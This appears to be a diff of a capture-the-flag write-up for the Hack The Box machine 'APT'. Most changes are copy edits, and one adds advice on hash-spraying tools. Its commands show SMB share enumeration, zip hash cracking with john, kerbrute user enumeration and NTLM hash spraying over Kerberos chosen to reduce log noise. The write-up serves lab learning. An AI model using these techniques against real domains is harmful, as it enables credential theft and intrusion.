@@ -71,11 +71,11 @@ SNMP is filtered. Dead end for now.
 
 With only ports 80 and 135 open on IPv4, we know a firewall is blocking standard AD ports (445, 389, 88, etc.). However, **Windows firewalls often forget to filter IPv6**.
 
-Port 135 always exposes the **IOXIDResolver** interface (`99fcfec4-5260-101b-bbcb-00aa0021347a`), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper, it's always available directly on port 135.
+Port 135 always exposes the **IOXIDResolver** interface (`99fcfec4-5260-101b-bbcb-00aa0021347a`), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper; it's always available directly on port 135.
 
 #### Why doesn't it appear in rpcdump?
 
-The `rpcdump.py` tool queries the **Endpoint Mapper (EPM)**, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there it's always reachable directly.
+The `rpcdump.py` tool queries the **Endpoint Mapper (EPM)**, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there — it's always reachable directly.
 
 #### How the attack works
 
@@ -236,7 +236,7 @@ SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----        
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share
-SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share```
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
 ```
 
 Anonymous access is allowed and we have **READ** permission on a `backup` share. Let's download what's inside.
@@ -264,7 +264,7 @@ cat backup_hash -p
 backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f0<REDACTED_HASH>
 ```
 
-After clean the hash we cracking the passwd.
+After cleaning up the hash, we crack the password:
 ```
 john backup_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 Using default input encoding: UTF-8
@@ -345,7 +345,7 @@ We found a cleartext password `<REDACTED>` in the LSA secrets, and 1999 domain u
 
 ## User Validation via Kerbrute
 
-We try a password spray with `<REDACTED>` first,no luck. Since port 88 (Kerberos) is open, we use `kerbrute` to validate which users from the dump still exist in the domain:
+We try a password spray with `<REDACTED>` first, but no luck. Since port 88 (Kerberos) is open, we use `kerbrute` to validate which users from the dump still exist in the domain:
 
 ```bash
 ./kerbrute_linux_amd64 userenum -d htb.local --dc apt6.htb users.txt
@@ -378,15 +378,15 @@ SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local
 The hash from 2020 is no longer valid. But here's the key insight: maybe henry.vinson is now using a password that matches another user's hash from the old dump. We extract all 1999 NTLM hashes and spray each one against henry.vinson via Kerberos.
 **Technical Note:** We performed the hash spray via Kerberos Pre-Authentication instead of traditional SMB for two reasons: speed and stealth. Kerberos is significantly faster and often generates less noise in event logs (Event ID 4768 for Kerberos vs Event ID 4625 for SMB). Furthermore, it allows us to validate credentials by simply requesting a TGT, without needing to establish a full connection to the file system (SMB shares).
 
-Wisp me on LinkedIn if you'd like to check out the script or discuss the logic!
+In a real engagement you wouldn't roll your own for this — `nxc smb <dc> -u henry.vinson -H hashes.txt --continue-on-success` sprays a hash list in one line, and [smartbrute](https://github.com/ShutdownRepo/smartbrute) does it over Kerberos while staying lockout-aware. That last point matters: each wrong hash is a failed pre-authentication that increments `badPwdCount`, so spraying a large list blindly can lock the target account. Here I wrote a small Impacket PoC purely to understand the Kerberos pre-auth internals — the logic, not the tool, is the takeaway.
 
 ```bash
 awk -F ":" '/^[a-zA-Z0-9._-]+:[0-9]+:/ {print $4}' secretsdump.txt > hashes_ntlm.txt
 
 python3 spray_henry.py hashes_ntlm.txt
 
-[*] Probando 1999 hashes contra henry.vinson...
-[+] ¡ÉXITO! Hash válido encontrado: <REDACTED_HASH>
+[*] Trying 1999 hashes against henry.vinson...
+[+] SUCCESS! Valid hash found: <REDACTED_HASH>
 ```
 
 Henry is reusing the NTLM hash of another user from the old dump. We now have valid credentials for him.
@@ -395,7 +395,7 @@ Henry is reusing the NTLM hash of another user from the old dump. We now have va
 
 ## Remote Registry Access with reg.py
 
-Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied, he doesn't have interactive login rights. However, there's another avenue: **Remote Registry via RPC**.
+Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied; he doesn't have interactive login rights. However, there's another avenue: **Remote Registry via RPC**.
 
 Windows administrators often forget to restrict Remote Registry access in GPOs, leaving it open as a way to read persistent configuration. If Henry has ever logged into this machine, his registry hive will be mounted under `HKU`.
 
@@ -520,7 +520,7 @@ User accounts for \\
 Administrator            DefaultAccount           Guest
 henry.vinson             henry.vinson_adm         krbtgt
 ```
-Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non standard locations.
+Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non-standard locations.
 ```powershell
 Evil-WinRM* PS C:\Users\henry.vinson_adm> cmd.exe /c dir /S /A
  Volume in drive C is System
